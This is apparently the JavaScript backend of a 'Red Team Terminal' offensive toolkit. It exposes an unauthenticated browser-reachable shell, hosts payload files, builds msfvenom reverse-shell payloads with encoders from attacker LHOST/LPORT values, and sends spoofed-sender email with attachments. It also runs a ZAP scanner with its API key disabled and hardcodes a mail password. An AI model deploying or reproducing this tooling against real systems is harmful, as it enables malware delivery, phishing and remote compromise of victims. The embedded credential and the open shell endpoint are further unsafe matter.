const { spawn } = require('child_process');
const http = require("http");
const express = require("express");
const socketIo = require("socket.io");
const pty = require("node-pty");
const os = require("os");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const crypto = require("crypto");
const AdmZip = require("adm-zip");

const multer = require("multer");
const nodemailer = require("nodemailer");
const imaps = require("imap-simple");
const MailComposer = require("nodemailer/lib/mail-composer");
const upload = multer({ dest: "uploads/" });
// ---------- Configuration (recommend moving these to .env in production) ----------
const SMTP_SERVER = process.env.SMTP_SERVER || "beltest.co.in";
const SMTP_PORT = Number(process.env.SMTP_PORT || 587);
const IMAP_SERVER = process.env.IMAP_SERVER || "beltest.co.in";
const IMAP_PORT = Number(process.env.IMAP_PORT || 143);

const USERNAME = process.env.EMAIL_USER || "aman";
const PASSWORD = process.env.EMAIL_PASS || "crlg#123";

const PORT = Number(process.env.PORT || 3001);

// ---------- App & server ----------
const app = express();
app.use(express.json({ limit: "5mb" }));
app.use(cors());

const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: "*" },
});

// ---------- PTY / Socket logic ----------
const terminals = {};

io.on("connection", (socket) => {
  const sessionId = socket.handshake.query.sessionId || socket.id;

  // Create PTY per sessionId if not exists
  if (!terminals[sessionId]) {
    const shell = os.platform() === "win32" ? "powershell.exe" : (process.env.SHELL || "bash");
    const ptyProcess = pty.spawn(shell, [], {
      name: "xterm-color",
      cols: 80,
      rows: 24,
      cwd: os.homedir(),
      env: process.env,
    });

    ptyProcess.on("data", (data) => {
      // broadcast to all sockets for this sessionId (if multiple clients attached)
      io.to(sessionId).emit("output", data);
    });

    terminals[sessionId] = ptyProcess;
  }

  // Join a room named after sessionId so multiple sockets can listen
  socket.join(sessionId);
  const ptyProcess = terminals[sessionId];
  socket.ptyProcess = ptyProcess;

  const username = (() => {
    try { return os.userInfo().username; } catch { return "user"; }
  })();
  const hostname = os.hostname();
  const cwd = "~";
  const welcomeMessage =
    `\x1b[1;32mWelcome to the Red Team Terminal\x1b[0m\r\n` +
    `Connected as: ${username}@${hostname}\r\n` +
    `Working Directory: ${cwd}\r\n` +
    `----------------------------------------\r\n\r\n`;

  socket.emit("output", welcomeMessage);

  socket.on("input", (data) => {
    // data is expected to be plain text to send to the pty
    try {
      ptyProcess.write(data);
    } catch (err) {
      console.error("write to pty error:", err);
    }
  });

  socket.on("terminal-cmd", ({ cmd }) => {
    try {
      // Ensure newline
      ptyProcess.write(cmd.endsWith("\n") ? cmd : cmd + "\n");
    } catch (err) {
      console.error("terminal-cmd error:", err);
    }
  });

  socket.on("logout", () => {
    try {
      ptyProcess.kill();
    } catch (e) {
      // ignore
    }
    delete terminals[sessionId];
    socket.leave(sessionId);
    socket.emit("output", "\r\nSession terminated.\r\n");
  });

  socket.on("disconnect", () => {
    // keep terminal alive on disconnect by design (as original)
    console.log(`Socket disconnected: ${sessionId} (socket id: ${socket.id}) — terminal state preserved`);
  });
});

// ---------- File-based endpoints (commands & listeners) ----------
const dataDir = __dirname;
const commandsPath = path.join(dataDir, "commands.json");
const listenersPath = path.join(dataDir, "listeners.json");

function safeReadJson(filePath, defaultValue = []) {
  try {
    if (!fs.existsSync(filePath)) return defaultValue;
    const raw = fs.readFileSync(filePath, "utf8");
    if (!raw) return defaultValue;
    return JSON.parse(raw);
  } catch (e) {
    console.error(`Error reading JSON from ${filePath}:`, e);
    return defaultValue;
  }
}

function safeWriteJson(filePath, data) {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), "utf8");
    return true;
  } catch (e) {
    console.error(`Error writing JSON to ${filePath}:`, e);
    return false;
  }
}

/* commands */
app.get("/api/commands", (req, res) => {
  const data = safeReadJson(commandsPath, []);
  res.json(data);
});

app.post("/api/commands", (req, res) => {
  const body = req.body || [];
  if (!Array.isArray(body)) {
    return res.status(400).json({ error: "Expected an array of commands" });
  }
  const ok = safeWriteJson(commandsPath, body);
  if (!ok) return res.status(500).json({ error: "Failed to save commands" });
  res.json({ success: true });
});

/* listeners */
app.get("/api/listeners", (req, res) => {
  const data = safeReadJson(listenersPath, []);
  res.json(data);
});

app.post("/api/listeners", (req, res) => {
  const body = req.body || [];
  if (!Array.isArray(body)) return res.status(400).json({ error: "Expected an array" });
  const ok = safeWriteJson(listenersPath, body);
  if (!ok) return res.status(500).json({ error: "Failed to save listeners" });
  res.json({ success: true });
});

app.get("/api/listeners/:id", (req, res) => {
  const id = req.params.id;
  const listeners = safeReadJson(listenersPath, []);
  const item = listeners.find((l) => String(l.id) === String(id));
  if (!item) return res.status(404).json({ error: "Listener not found" });
  res.json(item);
});

app.delete("/api/listeners/:id", (req, res) => {
  const id = req.params.id;
  const listeners = safeReadJson(listenersPath, []);
  const filtered = listeners.filter((l) => String(l.id) !== String(id));
  const ok = safeWriteJson(listenersPath, filtered);
  if (!ok) return res.status(500).json({ error: "Failed to save listeners" });
  res.json({ success: true });
});

// ---------- Host payloads (static serve) ----------
const payloadDir = path.join(__dirname, "public", "payloads");
if (!fs.existsSync(payloadDir)) {
  fs.mkdirSync(payloadDir, { recursive: true });
}
app.use("/payloads", express.static(payloadDir));

app.post("/api/host", (req, res) => {
  try {
    const { filename, payloadType, content, extension } = req.body;

    if (!payloadType || !content) {
      return res.status(400).json({ error: "payloadType and content are required" });
    }

    let ext = extension;
    if (!ext) {
      const pt = (payloadType || "").toLowerCase();
      if (pt === "powershell") ext = "ps1";
      else if (pt === "cscript" || pt === "wscript") ext = "vbs";
      else if (pt === "shellcode") ext = "bin";
      else if (pt === "binary" || pt === "installutil" || pt === "msbuild") ext = "exe";
      else ext = "txt";
    }

    const id = crypto.randomBytes(6).toString("hex");
    const safeBase =
      filename && typeof filename === "string"
        ? filename.replace(/[^a-zA-Z0-9_\\-\\.]/g, "_")
        : `${payloadType}_${id}`;

    const finalName = `${safeBase}.${ext}`;
    const filePath = path.join(payloadDir, finalName);

    fs.writeFile(filePath, content, "utf8", (err) => {
      if (err) {
        console.error("Failed to write hosted payload:", err);
        return res.status(500).json({ error: "Failed to host payload" });
      }

      const url = `${req.protocol}://${req.get("host")}/payloads/${encodeURIComponent(finalName)}`;
      return res.json({ url, filename: finalName });
    });
  } catch (err) {
    console.error("Host error:", err);
    return res.status(500).json({ error: "Failed to host payload" });
  }
});

// Use the 'upload.single' middleware to handle a single file upload named 'attachment'
app.post("/send-mail", upload.single("attachment"), async (req, res) => {
  let cleanupFiles = []; // Array to store paths of files needing deletion

  try {
    // Access form fields from req.body and file from req.file (thanks to multer)
    const { sender, receivers, subject, htmlContent, textBody } = req.body;
    const uploadedFile = req.file; 

    // 1. Receivers Parsing and Validation
    // Frontend sends 'receivers' as a stringified JSON array.
    let toList = [];
    if (!receivers) {
        if (uploadedFile) cleanupFiles.push(uploadedFile.path); 
        return res.status(400).json({ success: false, message: "No receivers provided." });
    }

    try {
        const parsedReceivers = JSON.parse(receivers);
        if (Array.isArray(parsedReceivers)) {
            toList = parsedReceivers.map(e => String(e).trim()).filter(e => e.length > 0);
        } else if (typeof receivers === "string") {
             // Fallback for simple comma/newline separated list if frontend changed its mind
            toList = receivers.split(/[,;\n]/).map(e => e.trim()).filter(e => e.length > 0);
        }
    } catch (e) {
        // If JSON parsing fails, try simple string split
        toList = receivers.split(/[,;\n]/).map(e => e.trim()).filter(e => e.length > 0);
    }

    if (toList.length === 0) {
        if (uploadedFile) cleanupFiles.push(uploadedFile.path); 
        return res.status(400).json({ success: false, message: "No valid receivers provided." });
    }

// 2. Attachment Handling (Send file as-is, no ZIP creation)
let attachments = [];

if (uploadedFile) {
    console.log(`User uploaded file: ${uploadedFile.originalname}. Sending original file as attachment.`);
    
    // Add file to cleanup list
    cleanupFiles.push(uploadedFile.path);

    // Push the uploaded file directly to attachments
    attachments.push({
        filename: uploadedFile.originalname,
        path: uploadedFile.path,
        contentType: uploadedFile.mimetype
    });
}


    // 3. Create Transporter
    const transporter = nodemailer.createTransport({
      host: SMTP_SERVER,
      port: SMTP_PORT,
      secure: SMTP_PORT === 465, 
      auth: {
        user: USERNAME,
        pass: PASSWORD,
      },
      tls: { rejectUnauthorized: false },
    });

    const mailOptions = {
      from: sender,
      to: toList,
      subject: subject || "(no subject)",
      text: textBody || "HTML Email. Please enable HTML view.",
      html: htmlContent || "<p>(no content)</p>",
      attachments: attachments.length > 0 ? attachments : undefined, // Include attachments only if present
    };

    // 4. Build Raw Message (for IMAP)
    const mail = new MailComposer(mailOptions);
    const rawMessage = await new Promise((resolve, reject) => {
      mail.compile().build((err, message) => {
        if (err) return reject(err);
        resolve(message);
      });
    });

    // 5. Send Email (nodemailer)
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent:", info.messageId, "accepted:", info.accepted);

    // 6. Append to IMAP Sent Folder
    let imapSuccess = false;
    let imapError = null;
    
    try {
      const imapConfig = {
        imap: {
          user: USERNAME,
          password: PASSWORD,
          host: IMAP_SERVER,
          port: IMAP_PORT,
          tls: IMAP_PORT === 993, 
          authTimeout: 30000,
        },
      };

      const connection = await imaps.connect(imapConfig);
      let boxName = "Sent";
      try {
        await connection.openBox(boxName);
      } catch (e) {
        boxName = "Sent Items";
        try {
          await connection.openBox(boxName);
        } catch (e2) {
          boxName = "INBOX";
          await connection.openBox(boxName);
        }
      }

      await connection.imap.append(rawMessage, { mailbox: boxName, flags: ["\\Seen"] });

      connection.end();
      console.log("Appended message to IMAP folder:", boxName);
      imapSuccess = true;
    } catch (imapErr) {
      console.error("IMAP append failed:", imapErr);
      imapError = String(imapErr);
    }
    
    // 7. Final Cleanup (Ensures temp files are deleted regardless of success/failure in steps 5/6)
    cleanupFiles.forEach(tempPath => {
        try {
            if (fs.existsSync(tempPath)) {
                fs.unlinkSync(tempPath);
                console.log(`Cleaned up temp file: ${tempPath}`);
            }
        } catch (e) {
            console.error(`Failed to clean up temp file ${tempPath}:`, e.message);
        }
    });


    // 8. Final Response
    if (imapSuccess) {
      res.json({ success: true, message: "Email sent & saved to Sent folder." });
    } else {
      res.json({ success: true, message: "Email sent but failed to save to Sent folder.", imapError: imapError });
    }

  } catch (err) {
    console.error("Fatal Error in /send-mail-unified:", err);
    
    // Attempt cleanup of any files that might have been created before the main cleanup block
    cleanupFiles.forEach(tempPath => {
        try { if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath); } catch (e) {}
    });
    // Cleanup multer's temporary file if it failed before being added to cleanupFiles
    if (req.file && fs.existsSync(req.file.path)) {
        try { fs.unlinkSync(req.file.path); } catch (e) {}
    }

    res.status(500).json({ success: false, message: err.message || "Internal Server Error" });
  }
});



// ----------  Payload generator ----------

app.post('/generate', async (req, res) => {
    const {
        payload,
        encoder,
        encoder_iteration,
        lhost,
        lport,
        payload_Type,
        payload_name,
        platform
    } = req.body;

    if ( !lhost || !lport || !payload || !payload_name || !payload_Type ) {
        return res.status(400).json({ error: 'Missing required fields.' });
    }

    // Force PowerShell payloads to be .ps1
// Normalize extension
let fileExt = payload_Type.toLowerCase();
let finalFilename;

if (fileExt === "psh" || fileExt === "powershell") {
    fileExt = "psh";
    finalFilename = `${payload_name}.ps1`;
} else if (fileExt === "raw" && platform.toLowerCase()==="windows") {
    fileExt = "raw";
    finalFilename = `${payload_name}.bat`;
} else if (fileExt === "raw" && platform.toLowerCase()==="linux") {
    fileExt = "raw";
    finalFilename = `${payload_name}.sh`;
}else {
    finalFilename = `${payload_name}.${fileExt}`;
}

const outputFilePath = path.join(__dirname, "payloads", finalFilename);


    if (!fs.existsSync(path.join(__dirname, "payloads"))) {
        fs.mkdirSync(path.join(__dirname, "payloads"), { recursive: true });
    }

    console.log("Saving payload to:", outputFilePath);

    // --------------------------------------------------------
    //  BUILD SAFE MSFVENOM ARGUMENTS
    // --------------------------------------------------------

    const msfvenomArgs = [
        "-p", payload,
        `LHOST=${lhost}`,
        `LPORT=${lport}`,
    ];

    // Only add encoder if BOTH fields are provided & non-empty
    const encoderProvided =
        encoder &&
        encoder.trim() !== "" &&
        encoder_iteration &&
        encoder_iteration.trim() !== "";

    if (encoderProvided) {
        console.log("Encoder enabled:", encoder, encoder_iteration);
        msfvenomArgs.push("-e", encoder);
        msfvenomArgs.push("-i", encoder_iteration);
    } else {
        console.log("No encoder used.");
    }

    // Add correct output format
    msfvenomArgs.push("-f", fileExt);

    console.log("MSFVENOM ARGS:", msfvenomArgs.join(" "));
 
    const msfvenom = spawn("msfvenom", msfvenomArgs);

    let outputBuffer = Buffer.alloc(0);
    let stderrOutput = "";

    msfvenom.stdout.on("data", chunk => {
        outputBuffer = Buffer.concat([outputBuffer, chunk]);
    });

    msfvenom.stderr.on("data", data => {
        stderrOutput += data.toString();
        console.log("stderr:", data.toString());
    });

    // ✅ ONLY ONE CLOSE HANDLER
    msfvenom.on("close", (code) => {
        console.log("Process exited with code:", code);

        if (code !== 0) {
            return res.status(500).json({
                error: "msfvenom failed",
                details: stderrOutput
            });
        }

        // Save the file
        fs.writeFile(outputFilePath, outputBuffer, (err) => {
            if (err) {
                console.error("File write error:", err);
                return res.status(500).json({ error: "Failed to save file" });
            }

            console.log("File saved:", outputFilePath);

            return res.json({
                message: "Payload generated successfully",
                filename: finalFilename,
                downloadUrl: `/payloads/${finalFilename}`
            });
        });
    });
});

app.use('/payloads', express.static(path.join(__dirname, 'payloads')));

app.get('/download/:filename', (req, res) => {
    const filename = req.params.filename;
    const filePath = path.join(__dirname, "payloads", filename);

    // Check if file exists
    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: "File not found" });
    }

    res.download(filePath, filename, (err) => {
        if (err) {
            console.error("Download error:", err);
            res.status(500).json({ error: "Download failed" });
        }
    });
});


// ===============================
// ZAP DAEMON MANAGER
// ===============================

let zapProcess = null;

function startZAPDaemon() {
  if (zapProcess) {
    return "[ZAP] Daemon already running\n";
  }

  zapProcess = spawn("zap.sh", [
    "-daemon",
    "-host", "0.0.0.0",
    "-port", "8090",
    "-config", "api.disablekey=true"
  ]);

  zapProcess.stdout.on("data", (data) => {
    io.emit("terminal", "[ZAP] " + data.toString());
  });

  zapProcess.stderr.on("data", (data) => {
    io.emit("terminal", "[ZAP ERROR] " + data.toString());
  });

  zapProcess.on("close", (code) => {
    io.emit("terminal", `\n[ZAP] Daemon stopped (code ${code})\n`);
    zapProcess = null;
  });

  return "[ZAP] Daemon starting on port 8090...\n";
}

function stopZAPDaemon() {
  if (!zapProcess) {
    return "[ZAP] Daemon is not running\n";
  }

  zapProcess.kill("SIGINT");
  zapProcess = null;
  return "[ZAP] Stopping daemon...\n";
}



// ===============================
// SOCKET.IO (TERMINAL STREAM)
// ===============================

io.on("connection", (socket) => {
  console.log("[SOCKET] Client connected");

  socket.on("zap-start", () => {
    const msg = startZAPDaemon();
    socket.emit("terminal", "\n" + msg);
  });

  socket.on("zap-stop", () => {
    const msg = stopZAPDaemon();
    socket.emit("terminal", "\n" + msg);
  });

  socket.on("disconnect", () => {
    console.log("[SOCKET] Client disconnected");
  });
});


// ===============================
// ZAP SCAN API
// ===============================

app.post("/api/zap/scan", (req, res) => {
  const { url } = req.body;

  if (!url) {
    return res.status(400).json({ error: "Target URL is required" });
  }

  io.emit("terminal", `\n[+] Initializing ZAP scan for: ${url}\n`);
  io.emit("terminal", "[*] Connecting to ZAP API on port 8090...\n");

  const scanProcess = spawn("python3", ["zap.py", url]);

  scanProcess.stdout.on("data", (data) => {
    io.emit("terminal", data.toString());
  });

  scanProcess.stderr.on("data", (data) => {
    io.emit("terminal", data.toString());
  });

  scanProcess.on("close", (code) => {
    io.emit(
      "terminal",
      `\n[✔] ZAP scan completed successfully (exit code ${code})\n`
    );
  });

  res.json({ status: "ZAP scan started" });
});

server.listen(PORT, () => {
  console.log(`Backend server running on http://localhost:${PORT}`);
});

